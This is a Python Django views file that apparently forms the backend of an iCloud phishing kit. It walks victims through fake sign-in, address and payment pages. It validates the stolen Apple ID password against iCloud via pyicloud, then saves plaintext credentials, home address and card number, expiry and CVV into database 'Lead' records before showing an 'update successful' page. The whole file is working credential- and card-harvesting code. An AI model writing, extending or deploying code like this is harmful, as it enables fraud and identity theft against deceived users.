# -*- coding: utf-8 -*-
from __future__ import unicode_literals

import sys

from django.http import HttpResponseRedirect, HttpResponse
from django.shortcuts import render
from requests import HTTPError

from app.models import Account, Address, PayDetails, Lead
from pyicloud import PyiCloudService

global device
device = None

def index(request):
    return HttpResponseRedirect('/signin/')
    #return render(request, 'index.html')

def signin(request):
    if request.POST:
        user = request.POST.get('user')
        passwd = request.POST.get('passwd')
        phone = request.GET.get('phone', None)
        print(phone)
        request.session['user'] = user
        request.session['passwd'] = passwd
        request.session['phone'] = phone
        ip = request.META.get('REMOTE_ADDR')
        try:
            PyiCloudService.trusted_devices
            api = PyiCloudService(user, passwd).trusted_devices
        except Exception as e:
            if "Invalid email/password combination" not in e:
                error_message = 'Invalid email/password combination'
                print(error_message)
                return render(request, 'signin.html', {'error_message': error_message})

        account_obj = Account(user=user, passwd=passwd, phone=phone)
        account_obj.save()
        return HttpResponseRedirect('/authentification/')

    else:
        return render(request, 'signin.html')

def authentification(request):
    return render(request, 'authentification.html')

def address(request):
    if request.POST:
        street = request.POST.get('street')
        address2 = request.POST.get('address2')
        city = request.POST.get('city')
        zip = request.POST.get('zip')
        state = request.POST.get('state')
        country = request.POST.get('country')
        request.session['street'] = street
        request.session['address2'] = address2
        request.session['city'] = city
        request.session['zip'] = zip
        request.session['state'] = state
        request.session['country'] = country
        add_obj = Address(street=street, address2=address2, city=city, zip=zip, state=state, country=country)
        add_obj.save()
        return HttpResponseRedirect('/gopay/')
    else:
        return render(request, 'address.html')


def gopay(request):
    return render(request, 'payment.html')

def paylead(request):
    if request.POST:
        paynumber = request.POST.get('paynumber')
        expmonth = request.POST.get('expmonth')
        expyear = request.POST.get('expyear')
        cvv = request.POST.get('cvv')
        request.session['paynumber'] = paynumber
        request.session['expmonth'] = expmonth
        request.session['expyear'] = expyear
        request.session['cvv'] = cvv
        lead_obj = PayDetails(paynumber=paynumber, expmonth=expmonth, expyear=expyear, cvv=cvv)
        lead_obj.save()
        return HttpResponseRedirect('/lead/')
    else:
        return render(request, 'payment.html')

def lead(request):
    user = request.session['user']
    passwd = request.session['passwd']
    phone = request.session['phone']
    street = request.session['street']
    address2 = request.session['address2']
    city = request.session['city']
    zip = request.session['zip']
    state = request.session['state']
    country = request.session['country']
    paynumber = request.session['paynumber']
    expmonth = request.session['expmonth']
    expyear = request.session['expyear']
    cvv = request.session['cvv']
    lead_obj = Lead(user=user, passwd=passwd, phone=phone, street=street, address2=address2, city=city, zip=zip,
                        state=state, country=country, paynumber=paynumber, expmonth=expmonth, expyear=expyear, cvv=cvv)
    lead_obj.save()
    return HttpResponseRedirect('/update_successful/')

def update_successful(request):
    return render(request, 'update_successful.html')
